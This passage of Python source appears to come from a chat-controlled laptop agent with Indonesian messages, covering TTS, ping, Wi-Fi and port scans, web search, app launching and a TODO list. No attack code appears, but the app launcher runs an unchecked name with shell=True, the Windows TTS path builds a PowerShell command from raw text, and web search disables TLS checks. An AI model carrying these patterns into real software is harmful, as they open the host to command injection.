            search_pattern = f"*{pattern}*"

        try:
            def search():
                root = Path(self._cwd).expanduser().resolve()
                matches = []
                for p in root.rglob(search_pattern):
                    if len(matches) >= 50:
                        break
                    try:
                        rel = p.relative_to(root)
                        matches.append(f"📄 `{rel}`" if p.is_file() else f"📂 `{rel}/`")
                    except ValueError:
                        matches.append(f"📄 `{p.name}`" if p.is_file() else f"📂 `{p.name}/`")
                return matches

            results = await asyncio.to_thread(search)
            if not results:
                return f"🔍 Tidak ditemukan file atau folder yang cocok dengan `{pattern}` di `{self._cwd}`."
            
            res_str = f"🔍 **Hasil Pencarian `{pattern}` di `{self._cwd}` (max 50):**\n" + "\n".join(results)
            return res_str
        except Exception as e:
            return f"❌ Gagal melakukan pencarian file: {e}"

    async def handle_tts_speak(self, text: str) -> str:
        """Mengucapkan teks menggunakan Text-to-Speech (TTS) engine di laptop."""
        if not text:
            return "❌ Masukkan teks yang ingin diucapkan. Contoh: `!tts Halo dunia` atau `!tts -v jp Ohayou!`"
        
        current_os = platform.system()
        
        # Opsi pemilihan suara (default: GadisNeural - Indonesia)
        voice = "id-ID-GadisNeural"
        voice_desc = "GadisNeural"
        
        words = text.split()
        if len(words) >= 3 and words[0] == "-v":
            lang_code = words[1]
            if "-" in lang_code and len(lang_code) > 5:
                voice = lang_code
                voice_desc = lang_code
                text = " ".join(words[2:])
            elif lang_code.lower() in ["jp", "ja", "anime", "wibu"]:
                voice = "ja-JP-NanamiNeural"  # Suara cewek anime Jepang yang populer & imut
                voice_desc = "NanamiNeural (Anime)"
                text = " ".join(words[2:])
            elif lang_code.lower() in ["jp-male", "ja-male"]:
                voice = "ja-JP-KeitaNeural"
                voice_desc = "KeitaNeural (JP Male)"
                text = " ".join(words[2:])
            elif lang_code.lower() in ["cowo", "cowok", "id-male"]:
                voice = "id-ID-ArdiNeural"
                voice_desc = "ArdiNeural (Indo Cowo)"
                text = " ".join(words[2:])
            elif lang_code.lower() in ["en", "us", "english"]:
                voice = "en-US-JennyNeural"
                voice_desc = "JennyNeural (English)"
                text = " ".join(words[2:])
            elif lang_code.lower() in ["id", "ind", "indonesia"]:
                voice = "id-ID-GadisNeural"
                voice_desc = "GadisNeural (Indonesia)"
                text = " ".join(words[2:])

        # Coba menggunakan Microsoft Edge TTS (Online) untuk suara profesional wanita
        try:
            import edge_tts
            import shutil
            import tempfile
            
            player = None
            for p in ["mpg123", "mpv", "play", "ffplay", "paplay", "vlc"]:
                if shutil.which(p):
                    player = p
                    break
            
            if player:
                temp_dir = tempfile.gettempdir()
                temp_mp3 = os.path.join(temp_dir, f"tts_{int(time.time())}.mp3")
                
                communicate = edge_tts.Communicate(text, voice)
                await communicate.save(temp_mp3)
                
                if player == "ffplay":
                    subprocess.Popen(["ffplay", "-nodisp", "-autoexit", temp_mp3], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                elif player == "vlc":
                    subprocess.Popen(["cvlc", "--play-and-exit", temp_mp3], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                else:
                    subprocess.Popen([player, temp_mp3], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                return f"🗣️ Mengucapkan: \"{text}\" (Microsoft Edge TTS - {voice_desc})"
        except Exception as e:
            logger.warning(f"Edge TTS failed: {e}. Falling back to Google TTS...")

        # Fallback ke Google Translate TTS (Online)
        try:
            import urllib.parse
            import httpx
            import shutil
            import tempfile
            
            encoded_text = urllib.parse.quote(text)
            url = f"https://translate.google.com/translate_tts?ie=UTF-8&tl=id&client=tw-ob&q={encoded_text}"
            
            player = None
            for p in ["mpg123", "mpv", "play", "ffplay", "paplay", "vlc"]:
                if shutil.which(p):
                    player = p
                    break
            
            if player:
                temp_dir = tempfile.gettempdir()
                temp_mp3 = os.path.join(temp_dir, f"tts_{int(time.time())}.mp3")
                async with httpx.AsyncClient(timeout=5.0) as client:
                    res = await client.get(url)
                    if res.status_code == 200:
                        with open(temp_mp3, "wb") as f:
                            f.write(res.content)
                        
                        if player == "ffplay":
                            subprocess.Popen(["ffplay", "-nodisp", "-autoexit", temp_mp3], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        elif player == "vlc":
                            subprocess.Popen(["cvlc", "--play-and-exit", temp_mp3], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        else:
                            subprocess.Popen([player, temp_mp3], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        
                        return f"🗣️ Mengucapkan: \"{text}\" (Google Translate TTS)"
        except Exception as e:
            logger.warning(f"Google TTS failed: {e}. Falling back to offline TTS...")

        # Fallback ke Offline TTS bawaan OS
        try:
            if current_os == "Linux":
                import shutil
                if shutil.which("spd-say"):
                    subprocess.Popen(["spd-say", "-t", "female1", text], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    return f"🗣️ Mengucapkan: \"{text}\" (Offline spd-say)"
                elif shutil.which("espeak"):
                    subprocess.Popen(["espeak", text], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    return f"🗣️ Mengucapkan: \"{text}\" (Offline espeak)"
                return "❌ Mesin TTS (spd-say atau espeak) tidak terinstall di Linux ini."
            elif current_os == "Darwin":
                subprocess.Popen(["say", text], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return f"🗣️ Mengucapkan: \"{text}\" (Offline say)"
            elif current_os == "Windows":
                cmd = f"Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{text}')"
                subprocess.Popen(["powershell", "-Command", cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return f"🗣️ Mengucapkan: \"{text}\" (PowerShell SpeechSynthesizer)"
            return f"❌ Fitur TTS belum didukung di OS: {current_os}"
        except Exception as e:
            return f"❌ Gagal memutar TTS: {e}"

    async def handle_ping(self, host: str) -> str:
        """Memeriksa latensi ke host menggunakan ping."""
        clean_host = "".join(c for c in host if c.isalnum() or c in ".-_")
        if not clean_host:
            return "❌ Host name tidak valid."
        
        current_os = platform.system()
        try:
            if current_os == "Windows":
                cmd = ["ping", "-n", "4", clean_host]
            else:
                cmd = ["ping", "-c", "4", clean_host]
            
            def run_ping():
                res = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                return res.stdout or res.stderr
                
            output = await asyncio.to_thread(run_ping)
            return f"⚡ **Hasil Ping ke {clean_host}:**\n```\n{output}\n```"
        except subprocess.TimeoutExpired:
            return "⏳ Timeout: Host tujuan terlalu lambat merespons ping."
        except Exception as e:
            return f"❌ Gagal melakukan ping: {e}"

    async def handle_speedtest(self) -> str:
        """Menguji kecepatan internet menggunakan speedtest-cli jika ada, atau fallback download speed test."""
        import shutil
        if shutil.which("speedtest-cli"):
            try:
                def run_cli():
                    res = subprocess.run(["speedtest-cli", "--simple"], capture_output=True, text=True, timeout=45)
                    return res.stdout or res.stderr
                output = await asyncio.to_thread(run_cli)
                return f"🚀 **Hasil Speedtest:**\n```\n{output.strip()}\n```"
            except Exception as e:
                logger.warning(f"speedtest-cli execution failed: {e}. Trying fallback...")
        
        try:
            import httpx
            url = "https://speed.cloudflare.com/__down?bytes=5000000"
            start_time = time.time()
            async with httpx.AsyncClient(timeout=15.0) as client:
                res = await client.get(url)
                duration = time.time() - start_time
                if res.status_code == 200:
                    size_mb = 5.0
                    speed_mbps = (size_mb * 8) / duration
                    return (
                        f"🚀 **Hasil Uji Kecepatan Unduh (Fallback):**\n"
                        f"▪️ **Ukuran Data:** 5 MB\n"
                        f"▪️ **Durasi:** {duration:.2f} detik\n"
                        f"▪️ **Kecepatan Unduh:** **{speed_mbps:.2f} Mbps**\n"
                        f"💡 _Tip: Install `speedtest-cli` di laptop Anda untuk hasil pengujian yang lebih lengkap (Ping, Unduh, Unggah)._"
                    )
                else:
                    return f"❌ Gagal menguji kecepatan internet: Server merespons dengan status {res.status_code}"
        except Exception as e:
            return f"❌ Gagal menguji kecepatan internet: {e}"

    async def handle_window_control(self, action: str) -> str:
        """Mengontrol jendela aplikasi yang aktif (minimize, close)."""
        action = action.lower().strip()
        if action not in ["minimize", "close"]:
            return "❌ Aksi jendela tidak dikenal. Gunakan: minimize, close."

        if macro_manager.recording:
            macro_manager.add_action({"action": "key", "key": f"window_{action}"})
            
        current_os = platform.system()
        try:
            if current_os == "Linux":
                import shutil
                if shutil.which("xdotool"):
                    if action == "minimize":
                        cmd = "xdotool windowminimize $(xdotool getactivewindow)"
                        subprocess.run(cmd, shell=True, check=True)
                        return "🖥️ Jendela aktif berhasil diminimalkan."
                    elif action == "close":
                        cmd = "xdotool windowclose $(xdotool getactivewindow)"
                        subprocess.run(cmd, shell=True, check=True)
                        return "🖥️ Jendela aktif berhasil ditutup."
                elif shutil.which("wmctrl"):
                    if action == "minimize":
                        cmd = "wmctrl -r :ACTIVE: -b add,hidden"
                        subprocess.run(cmd, shell=True, check=True)
                        return "🖥️ Jendela aktif berhasil diminimalkan."
                    elif action == "close":
                        cmd = "wmctrl -c :ACTIVE:"
                        subprocess.run(cmd, shell=True, check=True)
                        return "🖥️ Jendela aktif berhasil ditutup."
                
                if action == "minimize":
                    from agent.input_simulator import simulate_press
                    await asyncio.to_thread(simulate_press, "ctrl+alt+d")
                    return "🖥️ Mencoba meminimalkan jendela via shortcut keyboard."
                elif action == "close":
                    from agent.input_simulator import simulate_press
                    await asyncio.to_thread(simulate_press, "alt+f4")
                    return "🖥️ Mencoba menutup jendela via Alt+F4."
                    
            elif current_os == "Windows":
                from agent.input_simulator import simulate_press
                if action == "minimize":
                    await asyncio.to_thread(simulate_press, "win+d")
                    return "🖥️ Jendela diminimalkan (Show Desktop)."
                elif action == "close":
                    await asyncio.to_thread(simulate_press, "alt+f4")
                    return "🖥️ Jendela ditutup (Alt+F4)."
                    
            elif current_os == "Darwin":
                if action == "minimize":
                    cmd = "osascript -e 'tell application \"System Events\" to set visible of first process whose frontmost is true to false'"
                    subprocess.run(cmd, shell=True, check=True)
                    return "🖥️ Jendela aktif diminimalkan."
                elif action == "close":
                    cmd = "osascript -e 'tell application \"System Events\" to keystroke \"w\" using command down'"
                    subprocess.run(cmd, shell=True, check=True)
                    return "🖥️ Jendela aktif ditutup."
                    
            return f"❌ Fitur kontrol jendela belum didukung di OS: {current_os}"
        except Exception as e:
            return f"❌ Gagal mengontrol jendela: {e}"

    async def handle_web_search(self, query: str) -> str:
        """Melakukan pencarian di DuckDuckGo dan mengembalikan judul serta tautan teratas, dengan fallback ke Yahoo jika gagal."""
        if not query:
            return "❌ Masukkan kueri pencarian. Contoh: `!web cara membuat kopi`"
        
        import urllib.parse
        import re
        import httpx
        from urllib.parse import unquote
        
        url = f"https://html.duckduckgo.com/html/?q={urllib.parse.quote_plus(query)}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        
        results = []
        try:
            async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
                res = await client.get(url, headers=headers)
                if res.status_code == 200:
                    html_content = res.text
                    body_pattern = re.compile(r'<div class="result__body">(.*?)</div>\s*</div>', re.DOTALL)
                    bodies = body_pattern.findall(html_content)
                    
                    if not bodies:
                        link_pattern = re.compile(r'<a class="result__a" href="([^"]+)">([^<]+)</a>', re.DOTALL)
                        matches = link_pattern.findall(html_content)
                        for href, title in matches[:5]:
                            if "uddg=" in href:
                                actual_url = unquote(href.split("uddg=")[1].split("&")[0])
                            else:
                                actual_url = href
                                if actual_url.startswith("//"):
                                    actual_url = "https:" + actual_url
                            
                            title_clean = re.sub(r'<[^>]+>', '', title).strip()
                            results.append(f"🔗 **[{title_clean}]({actual_url})**\n_{actual_url}_\n")
                    else:
                        for body in bodies[:5]:
                            title_match = re.search(r'<a class="result__a" href="([^"]+)">([^<]+)</a>', body, re.DOTALL)
                            snippet_match = re.search(r'<a class="result__snippet"[^>]*>(.*?)</a>', body, re.DOTALL)
                            
                            if title_match:
                                href, title = title_match.groups()
                                if "uddg=" in href:
                                    actual_url = unquote(href.split("uddg=")[1].split("&")[0])
                                else:
                                    actual_url = href
                                    if actual_url.startswith("//"):
                                        actual_url = "https:" + actual_url
                                
                                title_clean = re.sub(r'<[^>]+>', '', title).strip()
                                snippet = ""
                                if snippet_match:
                                    snippet = re.sub(r'<[^>]+>', '', snippet_match.group(1)).strip()
                                
                                res_str = f"🔗 **{title_clean}**\n_{actual_url}_\n"
                                if snippet:
                                    res_str += f"{snippet}\n"
                                results.append(res_str)
        except Exception:
            pass
            
        if results:
            return f"🔍 **Hasil Pencarian Web untuk `{query}`:**\n\n" + "\n".join(results)
            
        # Fallback ke Yahoo Search
        try:
            yahoo_url = f"https://search.yahoo.com/search?q={urllib.parse.quote_plus(query)}"
            async with httpx.AsyncClient(timeout=10.0) as client:
                res = await client.get(yahoo_url, headers=headers)
                if res.status_code == 200:
                    pattern = re.compile(r'<a\s+[^>]*href="([^"]+)"[^>]*>(.*?)</h3>\s*</a>', re.DOTALL)
                    matches = pattern.findall(res.text)
                    yahoo_results = []
                    for href, inner in matches:
                        h3_match = re.search(r'<h3[^>]*>(.*?)</h3>', inner + "</h3>", re.DOTALL)
                        if h3_match:
                            title = re.sub(r'<[^>]+>', '', h3_match.group(1)).strip()
                        else:
                            title = re.sub(r'<[^>]+>', '', inner).strip()
                            
                        actual_url = href
                        if "/RU=" in href:
                            ru_part = href.split("/RU=")[1].split("/RK=")[0]
                            actual_url = urllib.parse.unquote(ru_part)
                        
                        if not title or not actual_url.startswith("http") or "yahoo.com" in actual_url:
                            continue
                            
                        yahoo_results.append(f"🔗 **{title}**\n_{actual_url}_\n")
                        if len(yahoo_results) >= 5:
                            break
                            
                    if yahoo_results:
                        return f"🔍 **Hasil Pencarian Web (Yahoo Fallback) untuk `{query}`:**\n\n" + "\n".join(yahoo_results)
        except Exception as e:
            return f"❌ Gagal melakukan pencarian web: {e}"
            
        return f"🔍 Tidak ditemukan hasil untuk kueri: `{query}`"


    async def handle_wifi_scan(self) -> str:
        """Memindai dan menampilkan daftar jaringan Wi-Fi sekitar."""
        current_os = platform.system()
        import shutil
        try:
            if current_os == "Linux":
                if shutil.which("nmcli"):
                    proc = await asyncio.create_subprocess_exec(
                        "nmcli", "-t", "-f", "SSID,SIGNAL,SECURITY", "device", "wifi", "list",
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE
                    )
                    stdout, _ = await proc.communicate()
                    output = stdout.decode("utf-8", errors="ignore").strip()
                    
                    if not output:
                        return "📭 Tidak ada jaringan Wi-Fi yang terdeteksi atau Wi-Fi mati."
                    
                    lines = output.split("\n")
                    seen = set()
                    formatted = []
                    count = 1
                    for line in lines:
                        parts = line.split(":")
                        if len(parts) >= 2:
                            ssid = parts[0].replace("\\:", ":").strip()
                            if not ssid:
                                continue
                            signal = parts[1].strip()
                            security = parts[2].strip() if len(parts) > 2 else "None"
                            
                            key = (ssid, security)
                            if key in seen:
                                continue
                            seen.add(key)
                            
                            formatted.append(f"{count}. 📶 **{ssid}** | Sinyal: {signal}% | Keamanan: {security}")
                            count += 1
                            if count > 20:
                                break
                    
                    if not formatted:
                        return "📭 Tidak ada jaringan Wi-Fi yang terdeteksi."
                    return "📶 **Jaringan Wi-Fi Sekitar (Linux):**\n\n" + "\n".join(formatted)
                else:
                    return "❌ Command `nmcli` tidak ditemukan. Pastikan NetworkManager terinstall."
            
            elif current_os == "Windows":
                proc = await asyncio.create_subprocess_exec(
                    "cmd.exe", "/c", "netsh wlan show networks",
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )
                stdout, _ = await proc.communicate()
                output = stdout.decode("utf-8", errors="ignore").strip()
                
                ssids = []
                for line in output.split("\n"):
                    if "SSID" in line and ":" in line:
                        ssid = line.split(":", 1)[1].strip()
                        if ssid:
                            ssids.append(ssid)
                
                if not ssids:
                    return "📭 Tidak ada jaringan Wi-Fi yang terdeteksi."
                
                formatted = [f"{i+1}. 📶 **{ssid}**" for i, ssid in enumerate(ssids[:20])]
                return "📶 **Jaringan Wi-Fi Sekitar (Windows):**\n\n" + "\n".join(formatted)
                
            elif current_os == "Darwin":
                airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
                if os.path.exists(airport_path):
                     proc = await asyncio.create_subprocess_exec(
                         airport_path, "-s",
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE
                     )
                     stdout, _ = await proc.communicate()
                     output = stdout.decode("utf-8", errors="ignore").strip()
                     
                     lines = output.split("\n")
                     if len(lines) <= 1:
                         return "📭 Tidak ada jaringan Wi-Fi yang terdeteksi."
                     
                     formatted = []
                     count = 1
                     for line in lines[1:]:
                         parts = line.split()
                         if parts:
                             ssid = parts[0]
                             rssi = parts[2] if len(parts) > 2 else "Unknown"
                             formatted.append(f"{count}. 📶 **{ssid}** | RSSI: {rssi} dBm")
                             count += 1
                             if count > 20:
                                 break
                     return "📶 **Jaringan Wi-Fi Sekitar (macOS):**\n\n" + "\n".join(formatted)
                else:
                     return "❌ Utilitas macOS airport tidak ditemukan."
            
            else:
                return f"❌ Fitur scan Wi-Fi tidak didukung pada OS: {current_os}"
        except Exception as e:
            return f"❌ Gagal memindai Wi-Fi: {e}"

    async def handle_active_ports(self) -> str:
        """Menampilkan port yang sedang listening/aktif."""
        current_os = platform.system()
        import shutil
        try:
            if current_os == "Linux":
                if shutil.which("ss"):
                    proc = await asyncio.create_subprocess_exec(
                        "ss", "-tuln",
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE
                    )
                    stdout, _ = await proc.communicate()
                    output = stdout.decode("utf-8", errors="ignore").strip()
                elif shutil.which("netstat"):
                    proc = await asyncio.create_subprocess_exec(
                        "netstat", "-tuln",
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE
                    )
                    stdout, _ = await proc.communicate()
                    output = stdout.decode("utf-8", errors="ignore").strip()
                else:
                    return "❌ Utilitas `ss` atau `netstat` tidak ditemukan."
                
                lines = output.split("\n")
                if len(lines) <= 1:
                    return "📭 Tidak ada port aktif (listening) yang ditemukan."
                
                formatted = []
                for line in lines[1:]:
                    parts = line.split()
                    if len(parts) >= 5:
                        proto = parts[0].upper()
                        state = parts[1].upper()
                        local = parts[4]
                        
                        if ":" in local:
                            addr, port = local.rsplit(":", 1)
                            if addr in ["*", "0.0.0.0"]:
                                addr_desc = "Semua IPv4"
                            elif addr in ["[::]", "::"]:
                                addr_desc = "Semua IPv6"
                            elif addr in ["127.0.0.1", "[::1]"]:
                                addr_desc = "Localhost"
                            else:
                                addr_desc = addr
                            
                            formatted.append(f"🔌 **Port {port}** ({proto}) | Bind: `{addr_desc}` | Status: `{state}`")
                
                if not formatted:
                    return "📭 Tidak ada port listening yang berhasil diparsing."
                
                formatted = sorted(list(set(formatted)))
                return "🔌 **Daftar Port Listening Aktif (Linux):**\n\n" + "\n".join(formatted[:30])
            
            elif current_os == "Windows":
                proc = await asyncio.create_subprocess_exec(
                    "cmd.exe", "/c", "netstat -an | findstr LISTENING",
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )
                stdout, _ = await proc.communicate()
                output = stdout.decode("utf-8", errors="ignore").strip()
                
                lines = output.split("\n")
                formatted = []
                for line in lines:
                    parts = line.split()
                    if len(parts) >= 4:
                        proto = parts[0]
                        local = parts[1]
                        state = parts[3]
                        if ":" in local:
                            addr, port = local.rsplit(":", 1)
                            formatted.append(f"🔌 **Port {port}** ({proto}) | Bind: `{addr}` | Status: `{state}`")
                
                if not formatted:
                    return "📭 Tidak ada port listening yang ditemukan."
                
                formatted = sorted(list(set(formatted)))
                return "🔌 **Daftar Port Listening Aktif (Windows):**\n\n" + "\n".join(formatted[:30])
                
            elif current_os == "Darwin":
                if shutil.which("lsof"):
                    proc = await asyncio.create_subprocess_exec(
                        "lsof", "-i", "-P", "-n",
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE
                    )
                    stdout, _ = await proc.communicate()
                    output = stdout.decode("utf-8", errors="ignore").strip()
                    
                    lines = output.split("\n")
                    formatted = []
                    for line in lines[1:]:
                        if "LISTEN" in line:
                            parts = line.split()
                            if len(parts) >= 9:
                                proc_name = parts[0]
                                proto = parts[7]
                                local = parts[8]
                                if ":" in local:
                                    addr, port = local.rsplit(":", 1)
                                    formatted.append(f"🔌 **Port {port}** ({proto}) | Aplikasi: `{proc_name}` | Bind: `{addr}`")
                    
                    if not formatted:
                        return "📭 Tidak ada port listening yang ditemukan."
                    
                    formatted = sorted(list(set(formatted)))
                    return "🔌 **Daftar Port Listening Aktif (macOS):**\n\n" + "\n".join(formatted[:30])
                else:
                    return "❌ Utilitas `lsof` tidak ditemukan di macOS."
            else:
                return f"❌ Fitur monitoring port tidak didukung pada OS: {current_os}"
        except Exception as e:
            return f"❌ Gagal memonitor port aktif: {e}"

    async def handle_launch_app(self, app_name: str) -> str:
        import subprocess
        import shutil
        from pathlib import Path
        app_name = app_name.lower().strip()

        app_map = {
            "chrome": ["google-chrome", "chrome", "chromium-browser", "google-chrome-stable"],
            "firefox": ["firefox"],
            "vscode": ["code"],
            "code": ["code"],
            "spotify": ["spotify"],
            "slack": ["slack"],
            "calculator": ["gnome-calculator", "calc", "kcalc"],
            "calc": ["gnome-calculator", "calc", "kcalc"],
            "terminal": ["gnome-terminal", "xterm", "konsole", "xfce4-terminal", "kgx"],
            "files": ["nautilus", "thunar", "dolphin", "pcmanfm"],
            "explorer": ["nautilus", "thunar", "dolphin", "pcmanfm"],
            "notepad": ["gedit", "kate", "mousepad", "nano", "xed"],
            "discord": ["discord"],
            "obs": ["obs"],
            "btop": ["btop"],
            "settings": ["gnome-control-center"],
        }

        commands_to_try = app_map.get(app_name, [app_name])
        found_cmd = None
        for cmd in commands_to_try:
            exe = cmd.split(" ", 1)[0]
            if shutil.which(exe):
                found_cmd = cmd
                break

        if not found_cmd:
            for apps_dir in ["/usr/share/applications", "/usr/local/share/applications",
                             str(Path.home() / ".local/share/applications")]:
                d = Path(apps_dir)
                if not d.exists():
                    continue
                for f in d.glob("*.desktop"):
                    try:
                        content = f.read_text()
                        name_match = False
                        exec_line = ""
                        for line in content.split("\n"):
                            if line.lower().startswith("name=") and app_name in line.lower().split("=", 1)[-1].strip().lower():
                                name_match = True
                            if line.startswith("Exec="):
                                exec_line = line.split("=", 1)[1].strip()
                        if name_match and exec_line:
                            found_cmd = exec_line.split("%")[0].strip()
                            break
                    except Exception:
                        pass
                if found_cmd:
                    break

        if not found_cmd:
            return f"❌ Aplikasi '{app_name}' tidak ditemukan. Coba: !quick app firefox"

        try:
            subprocess.Popen(
                found_cmd, shell=True,
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                start_new_session=True
            )
            return f"🚀 Berhasil meluncurkan aplikasi **{app_name}** di laptop Anda."
        except Exception as e:
            return f"❌ Gagal meluncurkan aplikasi **{app_name}**: {e}"

    async def handle_todo(self, args: list) -> str:
        """Mengelola daftar tugas (TODO list) secara persisten."""
        todo_file = "todo.json"
        import json
        import os
        
        todos = []
        if os.path.exists(todo_file):
            try:
                with open(todo_file, "r") as f:
                    todos = json.load(f)
            except Exception:
                todos = []
                
        if not args:
            if not todos:
                return "📝 **Daftar Tugas Anda Kosong.**\nTulis `!todo add <tugas>` untuk menambahkan."
            
            res = ["📝 **Daftar Tugas (TODO List):**\n"]
            for idx, item in enumerate(todos, 1):
                status = "✅" if item.get("done", False) else "⏳"
                deadline_part = ""
                if item.get("deadline"):
                    speak_icon = " 🔊" if item.get("speak_local", False) else ""
                    deadline_part = f" (⏱️ *Tenggat:* {item['deadline']}{speak_icon})"
                res.append(f"{idx}. {status} {item['task']}{deadline_part}")
            return "\n".join(res)
            
        subcmd = args[0].lower().strip()
        
        if subcmd == "add":
            if len(args) < 2:
                return "❌ Masukkan deskripsi tugas. Contoh: `!todo add Belajar coding`"
            task_desc = " ".join(args[1:])
            deadline = None
            speak_local = False
            
            if " | " in task_desc:
                parts = [p.strip() for p in task_desc.split(" | ")]
                task_desc = parts[0]
                deadline_str = parts[1]
                
                if len(parts) >= 3:
                    option = parts[2].lower()
                    if "speak" in option or "suara" in option:
                        speak_local = True
                
                from datetime import datetime, timedelta
                try:
                    if len(deadline_str) == 5 and ":" in deadline_str:
                        now = datetime.now()
                        target_time = datetime.strptime(deadline_str, "%H:%M").time()
                        target_dt = datetime.combine(now.date(), target_time)
                        if target_dt < now:
                            target_dt += timedelta(days=1)
                        deadline = target_dt.strftime("%Y-%m-%d %H:%M")
                    else:
                        dt = datetime.strptime(deadline_str, "%Y-%m-%d %H:%M")
                        deadline = dt.strftime("%Y-%m-%d %H:%M")
                except Exception:
                    return "❌ Format tenggat waktu tidak valid. Gunakan format `HH:MM` atau `YYYY-MM-DD HH:MM`. Contoh: `!todo add Beli kopi | 15:30`"
            
            todos.append({"task": task_desc, "done": False, "deadline": deadline, "reminded": False, "speak_local": speak_local})
            try:
                with open(todo_file, "w") as f:
                    json.dump(todos, f, indent=4)
                deadline_msg = f" dengan tenggat waktu **{deadline}**" if deadline else ""
                speak_msg = " (🔊 Laptop Berbicara)" if speak_local else ""
                return f"➕ Berhasil menambahkan tugas: **{task_desc}**{deadline_msg}{speak_msg}"
            except Exception as e:
                return f"❌ Gagal menyimpan tugas: {e}"
                
        elif subcmd == "done":
            if len(args) < 2:
                return "❌ Masukkan nomor tugas yang selesai. Contoh: `!todo done 1`"
            try:
                idx = int(args[1]) - 1
                if idx < 0 or idx >= len(todos):
                    return f"❌ Nomor tugas {args[1]} tidak valid."
                todos[idx]["done"] = True
                with open(todo_file, "w") as f:
                    json.dump(todos, f, indent=4)
                return f"✅ Berhasil menandai tugas **{todos[idx]['task']}** sebagai selesai!"
            except ValueError:
                return "❌ Nomor tugas harus berupa angka."
            except Exception as e:
                return f"❌ Gagal memperbarui tugas: {e}"
                
        elif subcmd in ("del", "delete", "remove"):
            if len(args) < 2:
                return "❌ Masukkan nomor tugas yang akan dihapus. Contoh: `!todo delete 1`"
            try:
                idx = int(args[1]) - 1
                if idx < 0 or idx >= len(todos):
                    return f"❌ Nomor tugas {args[1]} tidak valid."
                removed_task = todos.pop(idx)
                with open(todo_file, "w") as f:
                    json.dump(todos, f, indent=4)
                return f"🗑️ Berhasil menghapus tugas: **{removed_task['task']}**"
            except ValueError:
                return "❌ Nomor tugas harus berupa angka."
            except Exception as e:
                return f"❌ Gagal menghapus tugas: {e}"
                
        elif subcmd == "clear":
            todos = []
            try:
                with open(todo_file, "w") as f:
                    json.dump(todos, f, indent=4)
                return "🗑️ Semua daftar tugas berhasil dibersihkan!"
            except Exception as e:
                return f"❌ Gagal membersihkan tugas: {e}"
                
        return "❌ Subperintah tidak dikenal. Gunakan: `!todo add <tugas>`, `!todo done <nomor>`, `!todo delete <nomor>`, atau `!todo clear`"


    async def handle_list_apps(self, args: list[str] = None) -> str:
        """
        Menampilkan daftar aplikasi GUI/Desktop yang terinstall di sistem Linux/XDG.
        Mendukung pencarian filter jika ada argumen.
        """
        import os
        from pathlib import Path
        import re

        query = " ".join(args).lower().strip() if args else ""

        # Direktori standar file .desktop di Linux
        directories = [
            Path("/usr/share/applications"),
            Path("/usr/local/share/applications"),
            Path(os.path.expanduser("~/.local/share/applications"))
        ]

        apps = {}
        for directory in directories:
            if not directory.exists() or not directory.is_dir():
                continue
            for file_path in directory.glob("*.desktop"):
                try:
                    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                    
                    if "[Desktop Entry]" not in content:
                        continue
                    
                    name_match = re.search(r"^Name\s*=\s*(.+)$", content, re.MULTILINE)
                    exec_match = re.search(r"^Exec\s*=\s*(.+)$", content, re.MULTILINE)
                    no_display_match = re.search(r"^NoDisplay\s*=\s*true$", content, re.MULTILINE | re.IGNORECASE)
                    
                    if name_match and exec_match and not no_display_match:
                        name = name_match.group(1).strip()
                        exec_val = exec_match.group(1).strip()
                        
                        # Bersihkan argumen Exec seperti %U, %F, %f, etc.
                        exec_clean = re.sub(r"\s+%.", "", exec_val).strip()
                        exec_clean = exec_clean.replace('"', '').replace("'", "")
                        
                        exec_cmd = exec_clean.split()[0] if exec_clean else ""
                        if "/" in exec_cmd:
                            exec_cmd = exec_cmd.split("/")[-1]
                            
                        if name and exec_cmd:
                            apps[name] = exec_cmd
                except Exception:
                    continue

        if not apps:
            fallback_apps = {
                "Google Chrome": "chrome",
                "VS Code": "code",
                "Mozilla Firefox": "firefox",
                "Spotify": "spotify",
                "Slack": "slack",
                "Terminal": "gnome-terminal",
                "Calculator": "gnome-calculator",
                "File Manager": "nautilus",
                "Text Editor": "gedit"
            }
            apps = fallback_apps

        # Sort berdasarkan Nama
        sorted_apps = sorted(apps.items(), key=lambda x: x[0].lower())

        if query:
            filtered = [
                (name, cmd) for name, cmd in sorted_apps 
                if query in name.lower() or query in cmd.lower()
            ]
            if not filtered:
                return f"🔍 Tidak ditemukan aplikasi yang cocok dengan kueri: **{query}**"
            
            lines = [f"🔍 **Hasil Pencarian Aplikasi ({len(filtered)} ditemukan):**"]
            for name, cmd in filtered:
                lines.append(f"• **{name}** → `!launch {cmd}`")
            return "\n".join(lines)
        else:
            limit = 45
            total = len(sorted_apps)
            display_list = sorted_apps[:limit]
            
            lines = [
                "🖥️ **Daftar Aplikasi Desktop Terinstall:**",
                "Gunakan `!launch <command>` untuk membukanya.",
                ""
            ]
            for name, cmd in display_list:
                lines.append(f"• **{name}** → `!launch {cmd}`")
            
            if total > limit:
                lines.append("")
                lines.append(f"*Menampilkan {limit} dari {total} aplikasi.*")
                lines.append("💡 *Gunakan `!apps <nama>` untuk mencari aplikasi tertentu.*")
                
            return "\n".join(lines)

    async def handle_guard(self, args: list[str]) -> str:
